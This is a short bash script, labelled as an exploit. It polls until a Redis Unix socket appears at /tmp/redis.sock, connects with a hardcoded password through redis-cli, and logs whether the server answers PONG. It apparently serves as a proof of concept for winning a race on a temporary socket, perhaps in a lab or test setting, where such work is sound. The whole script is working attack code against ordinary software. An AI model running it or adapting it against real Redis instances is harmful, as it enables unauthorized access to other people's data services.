#!/bin/bash

SOCKET="/tmp/redis.sock"
LOGFILE="/tmp/exploit.log"
AUTH_PASS="offer_banner_complexpass"

touch $LOGFILE

echo "Starting exploit attempt..." >> $LOGFILE
echo "Exploit script started at $(date)" >> $LOGFILE

while [ ! -S "$SOCKET" ]; do
    sleep 0.01
done

echo "Socket found. Attempting to connect..." >> $LOGFILE

RESPONSE=$(redis-cli -s $SOCKET -a $AUTH_PASS ping 2>&1 | tail -n 1)

if [[ $RESPONSE == "PONG" ]]; then
    echo "Exploit successful: Connected to Redis and received PONG response" >> $LOGFILE
else
    echo "Exploit failed: $RESPONSE" >> $LOGFILE
fi
